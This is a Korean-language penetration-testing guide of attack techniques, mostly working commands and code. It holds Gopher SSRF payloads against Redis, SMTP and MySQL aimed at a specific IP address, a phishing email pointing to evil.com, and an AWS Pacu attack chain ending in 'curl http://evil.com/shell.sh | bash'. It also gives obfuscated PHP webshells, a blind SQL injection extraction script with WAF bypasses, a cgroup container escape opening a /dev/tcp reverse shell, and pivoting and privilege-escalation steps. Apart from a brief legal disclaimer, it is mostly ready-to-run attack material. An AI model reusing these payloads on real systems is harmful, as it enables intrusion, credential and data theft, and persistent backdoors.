# Phase 9: Advanced Techniques (고급 공격 기법)

고급 침투 기법 및 AWS 특화 공격 도구를 다룹니다.

## 📋 목차

1. [Gopher 프로토콜 SSRF](#gopher-프로토콜-ssrf)
2. [AWS 전용 공격 도구 (Pacu)](#aws-전용-공격-도구-pacu)
3. [은밀한 웹쉘 기법](#은밀한-웹쉘-기법)
4. [SQL Injection 고급 기법](#sql-injection-고급-기법)
5. [Container Escape](#container-escape)
6. [Pivoting & Lateral Movement](#pivoting--lateral-movement)

---

## Gopher 프로토콜 SSRF

### Gopher 프로토콜이란?

```
Gopher는 임의의 TCP 패킷을 전송할 수 있는 프로토콜:
- HTTP, SMTP, Redis, MySQL 등 다양한 프로토콜 시뮬레이션 가능
- SSRF 취약점에서 강력한 공격 도구
```

### Gopher로 Redis 공격

```bash
# Redis SET 명령 (웹쉘 업로드)
# 1. Redis 프로토콜 패킷 작성
cat > redis_payload.txt << 'EOF'
*3
$3
SET
$9
shell.php
$30
<?php system($_GET['cmd']); ?>
EOF

# 2. URL 인코딩
python3 << 'PYTHON'
import urllib.parse

with open('redis_payload.txt', 'rb') as f:
    payload = f.read()

# Gopher는 첫 번째 CR-LF를 무시하므로 앞에 더미 추가
gopher_payload = urllib.parse.quote(b'_' + payload)
print(f"gopher://127.0.0.1:6379/_{gopher_payload}")
PYTHON

# 3. SSRF 공격
curl "http://3.35.218.180/api/health.php?url=gopher://127.0.0.1:6379/_SET%0D%0Ashell.php%0D%0A..."
```

### Gopher로 SMTP 공격 (피싱 메일 발송)

```bash
# SMTP 프로토콜 패킷
PAYLOAD=$(cat <<'EOF'
HELO attacker.com
MAIL FROM:<admin@company.com>
RCPT TO:<victim@company.com>
DATA
From: IT Admin <admin@company.com>
To: Victim <victim@company.com>
Subject: Password Reset

Click here to reset your password: http://evil.com/phish
.
QUIT
EOF
)

# URL 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))"

# SSRF 공격
curl "http://3.35.218.180/api/health.php?url=gopher://127.0.0.1:25/_%URL_ENCODED_PAYLOAD%"
```

### Gopher로 MySQL 공격

```bash
# MySQL 인증 우회 (매우 복잡)
# Gopherus 도구 사용 권장

# Gopherus 설치
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
chmod +x gopherus.py

# MySQL 페이로드 생성
./gopherus.py --exploit mysql

# 출력된 Gopher URL을 SSRF에 사용
```

---

## AWS 전용 공격 도구 (Pacu)

### Pacu란?

```
AWS 침투 테스트 프레임워크:
- AWS 자격증명을 사용하여 자동화된 공격
- 권한 상승, 데이터 탈취, 지속성 확보 등
```

### Pacu 설치

```bash
# Kali Linux
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
bash install.sh
python3 pacu.py
```

### Pacu 기본 사용법

```bash
# Pacu 실행
python3 pacu.py

# 새 세션 생성
Pacu > new

# AWS 자격증명 설정
Pacu (new_session) > set_keys
# AccessKeyId: AKIAIOSFODNN7EXAMPLE
# SecretAccessKey: wJalrXUtnFEMI/...
# SessionToken: (선택)

# 모든 모듈 목록
Pacu (new_session) > ls

# 특정 모듈 검색
Pacu (new_session) > search ec2

# 도움말
Pacu (new_session) > help
```

### Pacu 주요 모듈

#### 1. IAM 권한 열거

```bash
# IAM 사용자 정보 수집
Pacu (session) > run iam__enum_users_roles_policies_groups

# 결과: 모든 IAM 사용자, 역할, 정책 목록
```

#### 2. EC2 정보 수집

```bash
# EC2 인스턴스 목록
Pacu (session) > run ec2__enum

# 결과: 인스턴스 ID, IP, 보안 그룹, IAM 역할 등
```

#### 3. S3 버킷 탈취

```bash
# S3 버킷 목록 및 권한 확인
Pacu (session) > run s3__bucket_finder

# 퍼블릭 버킷 찾기
Pacu (session) > run s3__download_bucket

# 특정 버킷 다운로드
Pacu (session) > run s3__download_bucket --bucket_name company-backup
```

#### 4. 권한 상승

```bash
# IAM 권한 상승 가능성 확인
Pacu (session) > run iam__privesc_scan

# 결과: CreateAccessKey, AttachUserPolicy 등 권한 상승 가능한 권한 발견
```

#### 5. Lambda 함수 탈취

```bash
# Lambda 함수 목록
Pacu (session) > run lambda__enum

# Lambda 함수 코드 다운로드
Pacu (session) > run lambda__download_code

# 결과: 함수 코드에 하드코딩된 자격증명 발견 가능
```

#### 6. RDS 스냅샷 탈취

```bash
# RDS 스냅샷 목록
Pacu (session) > run rds__enum_snapshots

# 스냅샷 퍼블릭 공유
Pacu (session) > run rds__explore_snapshots
```

#### 7. SSM을 통한 명령 실행

```bash
# SSM 접근 가능한 인스턴스 확인
Pacu (session) > run ssm__send_command --instance_ids i-1234567890abcdef0 --command "whoami"

# 결과: Root 쉘 획득 가능
```

### Pacu 공격 시나리오

```bash
# 1. 자격증명 설정
set_keys

# 2. 정찰
run iam__enum_users_roles_policies_groups
run ec2__enum
run s3__bucket_finder
run lambda__enum

# 3. 권한 상승
run iam__privesc_scan

# 4. 지속성
run iam__backdoor_users_keys

# 5. 데이터 탈취
run s3__download_bucket --bucket_name sensitive-data
run rds__explore_snapshots

# 6. 명령 실행
run ssm__send_command --command "curl http://evil.com/shell.sh | bash"
```

---

## 은밀한 웹쉘 기법

### 1. PHP Stream Wrapper 웹쉘

```php
<?php
// data:// 스트림 사용
if(isset($_GET['x'])) {
    include($_GET['x']);
}
?>

<!-- 사용법 -->
<!-- http://target.com/shell.php?x=data://text/plain;base64,PD9waHAgc3lzdGVtKCR7X0dFVH1bJ2NtZCddKTsgPz4= -->
```

### 2. .htaccess 웹쉘

```apache
# .htaccess 파일
<FilesMatch "^.+$">
  SetHandler application/x-httpd-php
</FilesMatch>

# 이미지 파일을 PHP로 실행
# logo.png에 PHP 코드 삽입
```

### 3. 난독화된 PHP 웹쉘

```php
<?php
// 고도로 난독화된 웹쉘
$a = str_rot13('flfgrz');  // system
$b = $_SERVER['HTTP_X_CMD'];  // 커스텀 헤더에서 명령 받기
$a($b);
?>

<!-- 사용법 -->
<!-- curl -H "X-Cmd: whoami" http://target.com/config.php -->
```

### 4. Polyglot 파일 (이미지 + PHP)

```bash
# 실제 이미지 파일 + PHP 코드
cat image.jpg > polyglot.jpg
echo '<?php system($_GET["c"]); ?>' >> polyglot.jpg

# .htaccess로 실행 활성화
echo 'AddType application/x-httpd-php .jpg' > .htaccess
```

### 5. 로그 파일 웹쉘

```bash
# Apache 로그에 PHP 코드 주입
curl "http://3.35.218.180/<?php system(\$_GET['cmd']); ?>"

# 로그 파일을 include
# http://3.35.218.180/page.php?file=/var/log/apache2/access.log&cmd=whoami
```

---

## SQL Injection 고급 기법

### Time-based Blind SQL Injection

```sql
-- 데이터베이스 이름 길이 추출
admin' AND IF(LENGTH(DATABASE())=8, SLEEP(5), 0)-- -

-- 데이터베이스 이름 한 글자씩 추출
admin' AND IF(SUBSTRING(DATABASE(),1,1)='w', SLEEP(5), 0)-- -

-- Python 자동화
```python
import requests
import string

url = "http://3.35.218.180/login.php"
db_name = ""

for position in range(1, 20):
    for char in string.ascii_lowercase + string.digits + '_':
        payload = f"admin' AND IF(SUBSTRING(DATABASE(),{position},1)='{char}', SLEEP(3), 0)-- -"
        data = {"username": payload, "password": "test"}

        start = time.time()
        requests.post(url, data=data)
        elapsed = time.time() - start

        if elapsed > 3:
            db_name += char
            print(f"[+] Database name: {db_name}")
            break
```

### Error-based SQL Injection

```sql
-- ExtractValue 함수 사용
admin' AND extractvalue(0x0a,concat(0x0a,(SELECT database())))-- -

-- UpdateXML 함수 사용
admin' AND updatexml(null,concat(0x0a,(SELECT version())),null)-- -

-- 에러 메시지에 데이터 노출
```

### WAF 우회 고급 기법

```sql
-- 1. Inline Comments
admin'/**/UNION/**/SELECT/**/1,2,3-- -

-- 2. Case Variation
admin' UnIoN SeLeCt 1,2,3-- -

-- 3. URL Encoding
admin'%20UNION%20SELECT%201,2,3--%20-

-- 4. Double URL Encoding
admin'%2520UNION%2520SELECT%25201,2,3--%2520-

-- 5. Character Encoding
admin' UNION SELECT CHAR(112,97,115,115,119,111,114,100)-- -

-- 6. Whitespace Alternatives
admin'UNION%0ASELECT%0D1,2,3-- -

-- 7. Scientific Notation
admin' UNION SELECT 1e0,2e0,3e0-- -
```

---

## Container Escape

### Docker 소켓 마운트 악용

```bash
# 컨테이너 내부에서 확인
ls -la /var/run/docker.sock

# Docker 소켓이 마운트된 경우
docker run -v /:/host -it ubuntu chroot /host bash

# 호스트 Root 권한 획득
```

### 특권 컨테이너 (--privileged) 탈출

```bash
# 특권 컨테이너 확인
cat /proc/self/status | grep CapEff

# 호스트 장치 마운트
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# 호스트 파일 시스템 접근
```

### cgroup notify_on_release 취약점

```bash
#!/bin/bash
# CVE-2022-0492 (cgroup v1 탈출)

# cgroup 생성
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# notify_on_release 활성화
echo 1 > /tmp/cgrp/x/notify_on_release

# 호스트 파일 경로 찾기
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Exploit 실행
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'bash -i >& /dev/tcp/공격자IP/4444 0>&1' >> /cmd
chmod +x /cmd

# 트리거
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Kubernetes Pod Escape

```bash
# 호스트 네트워크 모드 확인
cat /proc/1/cgroup

# ServiceAccount 토큰
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Kubernetes API 접근
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods

# 새 Pod 생성 (특권)
kubectl run -it --rm --image=ubuntu --privileged --overrides='{"apiVersion":"v1","spec":{"hostNetwork":true,"hostPID":true}}' escape -- bash
```

---

## Pivoting & Lateral Movement

### SSH 동적 포트 포워딩 (SOCKS Proxy)

```bash
# 대상 서버에서 SSH 터널 생성
ssh -D 1080 -N -f user@pivot_server

# Kali에서 ProxyChains 설정
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf

# 내부 네트워크 스캔
proxychains nmap -sT -Pn 172.31.0.0/24

# 내부 웹 서버 접근
proxychains firefox http://172.31.0.10
```

### SSH 로컬 포트 포워딩

```bash
# 대상 서버의 내부 MySQL을 Kali로 포워딩
ssh -L 3306:172.31.0.10:3306 user@3.35.218.180

# Kali에서 MySQL 접속
mysql -h 127.0.0.1 -u root -p
```

### SSH 리모트 포트 포워딩 (Reverse Tunnel)

```bash
# 대상 서버에서 실행
ssh -R 2222:localhost:22 공격자계정@공격자IP

# Kali에서 접속
ssh -p 2222 root@localhost
```

### Metasploit Pivoting

```bash
# Meterpreter 세션 획득 후
meterpreter > run autoroute -s 172.31.0.0/24

# Port Forward
meterpreter > portfwd add -l 3306 -p 3306 -r 172.31.0.10

# SOCKS Proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > run -j
```

### Chisel (HTTP 터널)

```bash
# Kali: Chisel 서버
chisel server --reverse --port 8080

# 대상 서버: Chisel 클라이언트
./chisel client 공격자IP:8080 R:socks

# ProxyChains로 사용
proxychains nmap 172.31.0.0/24
```

---

## 고급 권한 상승 기법

### LD_LIBRARY_PATH Hijacking

```bash
# 취약한 SUID 바이너리 찾기
find / -perm -4000 -type f 2>/dev/null

# ldd로 라이브러리 확인
ldd /usr/local/bin/vulnerable_binary

# 악의적인 공유 라이브러리 작성
gcc -shared -fPIC -o evil.so evil.c

# LD_LIBRARY_PATH로 로드
LD_LIBRARY_PATH=/tmp ./vulnerable_binary
```

### Python Library Hijacking

```bash
# Python 스크립트가 root로 실행되는 경우
cat /usr/local/bin/backup.py
# import os

# PYTHONPATH 우회
echo "import os; os.system('/bin/bash')" > os.py
export PYTHONPATH=/tmp
sudo python3 /usr/local/bin/backup.py
```

---

## 법적 고지

- 고급 공격 기법은 **강력한 파괴력**을 가짐
- **사전 승인된 침투 테스트**에만 사용
- AWS Pacu는 **실제 리소스 삭제** 가능성 있음
- 모든 행위는 **침투 테스트 보고서**에 기록

---

## 고급 기법 체크리스트

- [ ] Gopher 프로토콜 SSRF 테스트
- [ ] AWS Pacu로 클라우드 침투
- [ ] 은밀한 웹쉘 배치
- [ ] SQL Injection WAF 우회
- [ ] Container Escape 시도
- [ ] Pivoting으로 내부 네트워크 접근

---

## 다음 단계

모든 Phase를 학습한 후:
1. 실제 침투 테스트 수행
2. 상세한 보고서 작성
3. 취약점 패치 권고

[→ 실습 및 자동화 스크립트 참고](10_full_automation_script.py)
